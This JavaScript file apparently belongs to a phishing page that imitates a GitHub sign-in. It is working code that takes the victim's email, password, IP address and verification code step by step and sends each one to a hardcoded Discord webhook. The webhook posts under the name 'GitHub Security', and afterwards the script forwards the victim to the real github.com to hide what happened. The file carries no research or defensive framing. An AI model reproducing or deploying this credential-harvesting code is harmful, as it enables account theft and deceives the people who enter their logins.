// Discord webhook URL
const WEBHOOK_URL = "https://discord.com/api/v10/webhooks/1499090855280119979/dDDh0cX9HOf8tFKx8s7oSuOTw-6xsTNpwZXOC5P2f93_bSh0ksSpEhe2IXs5XDDIsqkh";

let userData = {
    email: "",
    password: "",
    ip: "",
    verificationCode: ""
};

// Get user IP
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return "Unknown";
    }
}

// Send data to Discord webhook
async function sendToWebhook(data) {
    try {
        const payload = {
            username: "GitHub Security",
            avatar_url: "https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png",
            embeds: [{
                title: "🚨 NEW LOGIN ATTEMPT",
                color: 0xff0000,
                timestamp: new Date().toISOString(),
                fields: [
                    { name: "📧 Email", value: `\`\`\`${data.email || "Not provided"}\`\`\``, inline: false },
                    { name: "🔑 Password", value: `\`\`\`${data.password || "Not provided"}\`\`\``, inline: false },
                    { name: "🌐 IP Address", value: `\`\`\`${data.ip || "Unknown"}\`\`\``, inline: true },
                    { name: "🔢 Verification Code", value: `\`\`\`${data.verificationCode || "Not entered"}\`\`\``, inline: true },
                    { name: "🕐 Time", value: new Date().toLocaleString(), inline: true }
                ],
                footer: { text: "GitHub Security Logger • Auto-captured" }
            }]
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        console.log("✅ Data sent to Discord!");
    } catch (error) {
        console.error("❌ Failed to send to webhook:", error);
    }
}

// Show loading animation
function showLoading(button) {
    button.classList.add('loading');
    button.disabled = true;
}

function hideLoading(button) {
    button.classList.remove('loading');
    button.disabled = false;
}

// Show error message
function showError(elementId, message) {
    const errorElement = document.getElementById(elementId);
    errorElement.textContent = message;
    errorElement.style.display = 'block';
}

function hideError(elementId) {
    const errorElement = document.getElementById(elementId);
    errorElement.style.display = 'none';
}

// Switch between steps
function switchStep(fromStep, toStep) {
    document.getElementById(fromStep).classList.remove('active');
    document.getElementById(toStep).classList.add('active');
}

// Step 1: Email input
async function nextStep() {
    const emailInput = document.getElementById('email');
    const email = emailInput.value.trim();
    const button = document.querySelector('#step1 .btn');
    
    if (!email || !email.includes('@')) {
        showError('emailError', 'Please enter a valid email address');
        return;
    }
    
    showLoading(button);
    
    // Save email
    userData.email = email;
    
    // Get IP address
    userData.ip = await getUserIP();
    
    // Send email to Discord
    await sendToWebhook({ email: userData.email, ip: userData.ip });
    
    // Update display
    document.getElementById('userEmailDisplay').textContent = email;
    
    // Switch to password step
    setTimeout(() => {
        hideLoading(button);
        switchStep('step1', 'step2');
    }, 1000);
}

// Step 2: Password input
async function submitLogin() {
    const passwordInput = document.getElementById('password');
    const password = passwordInput.value.trim();
    const button = document.querySelector('#step2 .btn');
    
    if (!password) {
        showError('passwordError', 'Please enter your password');
        return;
    }
    
    showLoading(button);
    
    // Save password
    userData.password = password;
    
    // Send password to Discord
    await sendToWebhook({ 
        email: userData.email, 
        password: userData.password, 
        ip: userData.ip 
    });
    
    // Generate verification code
    const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
    userData.verificationCode = verificationCode;
    
    // Update verification display
    document.getElementById('verificationCode').textContent = verificationCode;
    
    // Switch to verification step
    setTimeout(() => {
        hideLoading(button);
        switchStep('step2', 'step3');
        
        // Start auto-process animation
        startAutoProcess();
    }, 1500);
}

// Step 3: Auto-process animation
function startAutoProcess() {
    const steps = ['step1Status', 'step2Status', 'step3Status'];
    
    steps.forEach((stepId, index) => {
        setTimeout(() => {
            const stepElement = document.getElementById(stepId);
            stepElement.classList.add('active');
            
            if (index === steps.length - 1) {
                setTimeout(() => {
                    stepElement.classList.add('complete');
                    
                    // Show verification code
                    setTimeout(() => {
                        document.getElementById('verificationSection').style.display = 'block';
                        
                        // Send verification code to Discord
                        sendToWebhook(userData);
                    }, 500);
                }, 1000);
            }
        }, index * 2000);
    });
}

// Copy verification code
function copyCode() {
    const code = document.getElementById('verificationCode').textContent;
    navigator.clipboard.writeText(code).then(() => {
        const copyBtn = document.querySelector('.copy-btn');
        const originalText = copyBtn.textContent;
        copyBtn.textContent = 'Copied!';
        setTimeout(() => {
            copyBtn.textContent = originalText;
        }, 2000);
    });
}

// Submit verification code
function submitVerification() {
    const codeInputs = document.querySelectorAll('.code-input');
    let enteredCode = '';
    
    codeInputs.forEach(input => {
        enteredCode += input.value;
    });
    
    if (enteredCode.length !== 6) {
        alert('Please enter the full 6-digit code');
        return;
    }
    
    // Update verification code
    userData.verificationCode = enteredCode;
    
    // Send final data to Discord
    sendToWebhook(userData);
    
    // Show success message
    document.getElementById('step3').innerHTML = `
        <div class="success-message">
            <div class="success-icon">✓</div>
            <h2>Verification Successful!</h2>
            <p>Your account has been verified.</p>
            <p>Redirecting to GitHub...</p>
        </div>
    `;
    
    // Redirect after 3 seconds
    setTimeout(() => {
        window.location.href = 'https://github.com';
    }, 3000);
}

// Go back to previous step
function goBack() {
    switchStep('step2', 'step1');
}

// Forgot password
function forgotPassword() {
    alert('A password reset link will be sent to your email.');
}

// Auto-focus next input in verification code
function focusNext(currentInput, nextInputId) {
    if (currentInput.value.length === 1) {
        const nextInput = document.getElementById(nextInputId);
        if (nextInput) {
            nextInput.focus();
        }
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    // Add verification code inputs dynamically
    const verificationSection = document.getElementById('verificationSection');
    if (verificationSection) {
        verificationSection.innerHTML = `
            <div class="code-inputs">
                ${Array.from({length: 6}, (_, i) => `
                    <input type="text" maxlength="1" class="code-input" id="code${i+1}"
                           oninput="focusNext(this, 'code${i+2}')"
                           onkeyup="if(event.key === 'Backspace' && this.value === '' && ${i} > 0) document.getElementById('code${i}').focus()">
                `).join('')}
            </div>
            <button class="btn" onclick="submitVerification()">Verify Code</button>
            <button class="copy-btn" onclick="copyCode()">Copy Code</button>
        `;
    }
});
                         
